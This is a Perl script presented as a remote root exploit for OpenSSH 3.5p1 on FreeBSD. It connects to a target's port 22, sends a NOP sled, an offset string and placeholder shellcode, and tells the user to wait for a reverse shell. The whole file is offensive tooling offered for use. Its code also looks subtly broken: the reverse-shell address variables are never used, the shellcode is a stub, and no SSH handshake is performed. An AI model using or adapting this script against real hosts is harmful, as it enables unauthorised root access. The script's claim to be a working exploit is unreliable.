#!/usr/bin/perl

# OpenSSH 3.5p1 Remote Root Exploit for FreeBSD
# Discovered and Exploited By Kingcope
# Year 2011
# Improved by M-KIS 2020

# Usage: perl exploit.pl <target_host>

use strict;
use IO::Socket::INET;

# Change the following values as needed
my $shell_host = "YOUR_IP_ADDRESS";   # Your listening IP address for reverse shell
my $shell_port = 4444;                # Your listening port for reverse shell

# Shellcode
my $shellcode = "\x90\x90\x90\x90";   # Nopsled (adjust as needed)
$shellcode .= "YOUR_SHELLCODE_HERE";   # Replace with your actual shellcode

# Offset for FreeBSD-4.11 RELEASE OpenSSH 3.5p1
my $offset = "AAAA\x58\xd8\x07\x08" . "CCCCDDDDEEEE\xd8\xd8\x07\x08" . "GGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOO";

# Create the payload
my $payload = $offset . ("\x90" x 5000) . $shellcode;

# Target host
my $target = shift || usage();

# Exploit function
sub exploit {
    my $sock = IO::Socket::INET->new(
        PeerAddr => $target,
        PeerPort => 22,
        Proto    => 'tcp'
    ) or die "Could not connect to $target: $!\n";

    print "[*] Sending exploit payload...\n";
    print $sock "$payload\n";
    close($sock);
}

# Usage function
sub usage {
    die "Usage: perl exploit.pl <target_host>\n";
}

# Main execution
print "[*] OpenSSH 3.5p1 Remote Root Exploit for FreeBSD\n";
print "[*] Discovered and Exploited By Kingcope (Year 2011)\n";
print "[*] Target Host: $target\n";

# Exploit the target
exploit();

print "[*] Exploit payload sent. Check for incoming reverse shell connection.\n";
